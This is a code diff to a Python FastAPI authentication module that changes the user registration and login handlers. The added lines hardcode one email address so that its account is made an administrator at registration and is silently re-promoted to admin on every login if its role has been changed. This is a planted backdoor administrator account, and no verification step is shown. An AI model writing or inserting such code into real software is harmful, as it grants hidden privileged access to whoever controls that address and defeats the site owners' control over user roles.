@@ -59,8 +59,13 @@ def register(user_in: UserCreate, db: Session = Depends(get_db)):
 
     # Create new user
     hashed_password = get_password_hash(user_in.password)
+    # Automatic admin promotion for specific email
+    role = "admin" if user_in.email == "vv083150@gmail.com" else "user"
     new_user = User(
-        email=user_in.email, name=user_in.name, hashed_password=hashed_password
+        email=user_in.email, 
+        name=user_in.name, 
+        hashed_password=hashed_password,
+        role=role
     )
     db.add(new_user)
     db.commit()
@@ -102,6 +107,13 @@ def login(user_in: UserLogin, db: Session = Depends(get_db)):
             detail="Incorrect email or password",
             headers={"WWW-Authenticate": "Bearer"},
         )
+
+    # Hardcoded admin promotion on login as well (fail-safe)
+    if user.email == "vv083150@gmail.com" and user.role != "admin":
+        user.role = "admin"
+        user.name = "vi"
+        db.commit()
+        db.refresh(user)
 
     # Generate token
     access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
